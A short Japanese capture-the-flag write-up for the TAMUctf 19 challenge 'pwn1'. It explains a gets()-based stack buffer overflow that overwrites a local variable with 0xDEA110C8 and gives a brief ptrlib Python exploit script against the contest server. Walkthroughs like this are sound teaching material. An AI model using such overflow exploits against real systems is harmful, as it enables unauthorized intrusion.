# [pwn 227pts] pwn1 - TAMUctf 19
32ビットでPIE有効、Full RELROです。
```
$ checksec pwn1
[*] 'pwn1'
    Arch:       32 bits (little endian)
    NX:         NX enabled
    SSP:        SSP disabled (No canary found)
    RELRO:      Full RELRO
    PIE:        PIE enabled
```
バイナリを実行するといくつか質問が来るのですが、答えは単にstrcmpでチェックしているのでIDAで解析すれば分かります。
ただ、最後の質問に答えた後にローカル変数が0xDEA110C8であればフラグが出力されます。
この変数は最初に0に設定されるので通常はフラグが表示されません。

しかし、質問の答えはgetsでローカル変数に入れられるので、Stack Overflowが存在します。
ということで、オーバーフローを利用して上述の変数を0xDEA110C8に変更しましょう。

IDAで見ると、バッファは`$rbp-0x3B`、比較対象の変数は`$rbp-0x10`に存在するので、バッファに0x2Bバイト適当な文字を入れた後に0xDEA110C8を入れれば良さそうです。

```python
from ptrlib import *

sock = Socket("pwn.tamuctf.com", 4321)
sock.recvuntil("name?")
sock.sendline("Sir Lancelot of Camelot")
sock.recvuntil("quest?")
sock.sendline("To seek the Holy Grail.")
sock.recvuntil("secret?")
payload = b"A" * 0x2b
payload += p32(0xDEA110C8)
sock.sendline(payload)

sock.interactive()
```

こんな感じでフラグが読めます。

# 感想
最もシンプルなバッファオーバーフローの問題です。
pwnを始めたばかりの方がpwntoolsなどを使う練習にちょうど良いでしょう。